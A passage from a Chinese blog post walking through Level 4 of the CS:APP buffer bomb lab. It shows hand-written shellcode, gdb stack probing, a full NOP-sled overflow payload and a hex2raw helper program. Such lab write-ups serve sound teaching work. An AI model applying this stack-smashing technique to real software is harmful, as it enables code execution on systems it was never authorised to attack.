+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c1c: 55                      push   %ebp</div><div class="line">8048c1d: 89 e5                   mov    %esp,%ebp</div><div class="line">8048c1f: 83 ec 28                sub    $0x28,%esp</div></pre></td></tr></table></figure>
+<p>可知%esp=%ebp-0x28,即<br>%ebp=%esp+0x28<br>其中，getbufn执行ret前的leave指令已经正确地恢复%esp(leave等价于 mov %ebp,%esp; pop %ebp，我们的字符串无法覆盖%ebp,%esp寄存器，%esp是从寄存器%ebp里来的，因此是正确的)。</p>
+<p>可以开始写代码~(≧▽≦)/~啦啦啦，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi rettestn.s</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x2a50279f, %eax       //将cookie写入%eax,作为getbufn返回值</div><div class="line">lea 0x28(%esp), %ebp        //%ebp=%esp+0x28,恢复%ebp</div><div class="line">push $0x8048c2e</div><div class="line">ret                         //最后两句返回到testn中call getbufn下一句</div></pre></td></tr></table></figure>
+<p>保存后，进行编译，再反汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -c rettestn.s</div><div class="line">objdump -d rettestn.o &gt; rettestn_asm</div></pre></td></tr></table></figure>
+<p>打开rettestn_asm有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: b8 9f 27 50 2a         mov    $0x2a50279f,%eax</div><div class="line">   5: 8d 6c 24 28            lea    0x28(%esp),%ebp</div><div class="line">   9: 68 2e 8c 04 08         push   $0x8048c2e</div><div class="line">   e: c3                     ret</div></pre></td></tr></table></figure>
+<p>可是我们还不知道返回地址应该用什么来填充。字符串首地址是变化的，虽然可以通过%esp间接求出，但在程序跳转到我们的代码之前，我们无法得知%esp的值究竟是多少（原来可以用gdb调试出来，但现在不行了）。幸好getbufn给的栈空间很大，我们可以利用nop slide技术，先让程序返回到一个我们大致猜测的地址，在这个地址及其附近的一大片区域里我们用nop指令(机器码为0x90)填充，CPU执行nop指令时除了程序计数器PC自加，别的什么也不做。把我们的代码放在这片区域的高位地址处，程序一路执行nop,就像滑行一样，一路滑到我们的代码才真正开始执行。我们可以利用gdb调试找到这个字符串开始的大致区域。</p>
+<p>查看getbufn()汇编代码,有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">8048bef: 8d 85 f8 fd ff ff    lea    -0x208(%ebp),%eax</div></pre></td></tr></table></figure>
+<p>得知写入字符串的首地址为-0x208(%ebp)，而返回地址位于0x4(%ebp)，因此我们需填充0x4-（-0x208）= 0x20c = 524个字节的字符，再写4个字节覆盖getbufn()的返回地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gdb bufbomb</div><div class="line">(gdb) b *0x8048bf5</div><div class="line">(gdb) r xxx -n -u yy</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">$1 = 0x556838f8</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$2 = 0x556838c8</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x55683958</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x55683958</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x556838a8</div></pre></td></tr></table></figure>
+<p>返回地址只要大于0x55683958即可，就取0x55683980(80 39 68 55)吧。</p>
+<p>因此我们要输入的16进制数字为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 b8</div><div class="line">9f 27 50 2a 8d 6c 24 28 68 2e</div><div class="line">8c 04 08 c3 80 39 68 55</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ ./hex2raw -n in4 out4</div><div class="line">$ ./bufbomb &lt; out4 -n -u yy</div><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
+<p>打完收工~</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>我的hex2raw源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, const char * argv[])</div><div class="line">&#123;</div><div class="line">    FILE *infile, *outfile;</div><div class="line">    int h, i;</div><div class="line">    //printf(&quot;%s, %s\n&quot;, argv[1], argv[2]);</div><div class="line">    if(strcmp(argv[1], &quot;-n&quot;))</div><div class="line">    &#123;</div><div class="line">        if(!(infile = fopen(argv[1], &quot;r&quot;)) || !(outfile = fopen(argv[2], &quot;w+&quot;)))&#123;</div><div class="line">            printf(&quot;打开文件错误!\n&quot;);</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        while(fscanf(infile, &quot;%x&quot;, &amp;h) != EOF)</div><div class="line">            fprintf(outfile, &quot;%c&quot;, h);</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        if(!(infile = fopen(argv[2], &quot;r&quot;)) || !(outfile = fopen(argv[3], &quot;w+&quot;)))&#123;</div><div class="line">            printf(&quot;打开文件错误!\n&quot;);</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        for(i = 0; i &lt; 5; i ++)&#123;</div><div class="line">            while(fscanf(infile, &quot;%x&quot;, &amp;h) != EOF)</div><div class="line">                fprintf(outfile, &quot;%c&quot;, h);</div><div class="line">            fprintf(outfile, &quot;%c&quot;, &apos;\n&apos;);</div><div class="line">            rewind(infile);     //文件内部指针重新指向输入流开头</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    fclose(infile);</div><div class="line">    fclose(outfile);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./hex2raw         // 输入文件名 输出文件名</div><div class="line">./hex2raw -n      // 输入文件名 输出文件名</div></pre></td></tr></table></figure>
+<p>只支持以上两种格式<br>用于csapplab的bufbomb, 官网上下载的hex2raw死活用不了，出现同样问题的同学可以拿它自己编译试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -c main.c -o hex2raw</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/csapp/" rel="tag"># csapp</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/04/有趣的概率题/" rel="next" title="有趣的概率题">
+                <i class="fa fa-chevron-left"></i> 有趣的概率题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/01/Logistic回归/" rel="prev" title="逻辑回归">
+                逻辑回归 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/7233064.jpg"
+               alt="Yiyang Peng" />
+          <p class="site-author-name" itemprop="name">Yiyang Peng</p>
+           
+              <p class="site-description motion-element" itemprop="description">Try try try Never mind</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/yiyang186" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/peng-yiyang-88" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验内容"><span class="nav-number">1.</span> <span class="nav-text">实验内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前期准备"><span class="nav-number">2.</span> <span class="nav-text">前期准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-0"><span class="nav-number">3.</span> <span class="nav-text">Level 0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-1"><span class="nav-number">4.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-2"><span class="nav-number">5.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-3"><span class="nav-number">6.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-4"><span class="nav-number">7.</span> <span class="nav-text">Level 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附录"><span class="nav-number">8.</span> <span class="nav-text">附录</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiyang Peng</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
